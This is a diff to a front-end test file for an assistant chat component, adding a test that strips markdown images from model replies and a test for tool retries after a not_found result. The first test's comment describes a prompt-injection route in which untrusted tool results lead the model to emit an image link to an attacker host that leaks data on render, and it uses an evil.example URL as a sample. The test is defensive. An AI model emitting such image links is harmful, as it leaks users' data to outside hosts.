@@ -284,6 +284,25 @@ describe("AssistantChat", () => {
     expect(screen.queryByRole("link", { name: /assistent\.viewPayment/ })).not.toBeInTheDocument();
   });
 
+  it("drops markdown images from the assistant's reply, but keeps links", async () => {
+    // Untrusted third-party text reaches the model through the Bundestakt tool results, which
+    // run with no confirmation step, and the system prompt asks the model to echo their urls. A
+    // markdown image fetches itself the moment it renders, so an injected
+    // `![](https://attacker/?q=…)` would exfiltrate on sight; a link needs a click. See the
+    // comment at the ReactMarkdown call site in AssistantChat.tsx.
+    mockSendMessage.mockResolvedValueOnce(
+      textResponse("Look: ![x](https://evil.example/p.png) and [a source](https://bundestakt.de/s)"),
+    );
+
+    const { container } = renderWithQuery(<AssistantChat />);
+    sendUserMessage("What happened in the Bundestag?");
+
+    await waitFor(() => {
+      expect(screen.getByRole("link", { name: "a source" })).toBeInTheDocument();
+    });
+    expect(container.querySelector("img")).toBeNull();
+  });
+
   describe("tool-call loop", () => {
     it("shows a confirm card pre-filled from the model's tool call, and never auto-executes", async () => {
       mockSendMessage.mockResolvedValueOnce(
@@ -382,6 +401,38 @@ describe("AssistantChat", () => {
       });
 
       consoleError.mockRestore();
+    });
+
+    it("keeps offering a tool after not_found, so the model can retry with a corrected slug", async () => {
+      // The system prompt tells the model to call get_sitzungen twice: once without a slug to
+      // list sessions, once with the chosen slug for details. A wrong slug on the second call is
+      // a normal, recoverable outcome — unlike a real failure, it must not withdraw the tool.
+      const goodSlug = (sitzungenFixture.sitzungen[0] as { slug: string }).slug;
+      mockSendMessage
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: "not-a-real-slug" }))
+        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: goodSlug }))
+        .mockResolvedValueOnce(textResponse("Here is what happened in that session."));
+
+      renderWithQuery(<AssistantChat />);
+      sendUserMessage("Tell me about that session");
+
+      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(3));
+
+      // The bad slug came back not_found (asserted via the tool result below), yet hop 2 still
+      // offers get_sitzungen — that is the fix.
+      const offeredNames = (i: number) =>
+        ((mockSendMessage.mock.calls[i][1] as { tools?: { function: { name: string } }[] }).tools ?? []).map(
+          (t) => t.function.name,
+        );
+      expect(offeredNames(1)).toContain("get_sitzungen");
+
+      const firstConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
+      const firstToolResult = firstConvo.find((m) => m.role === "tool");
+      expect(JSON.parse(firstToolResult!.content)).toEqual({ status: "not_found" });
+
+      await waitFor(() => {
+        expect(screen.getByText("Here is what happened in that session.")).toBeInTheDocument();
+      });
     });
 
     it("stops after MAX_HOPS and captions the image it did generate", async () => {
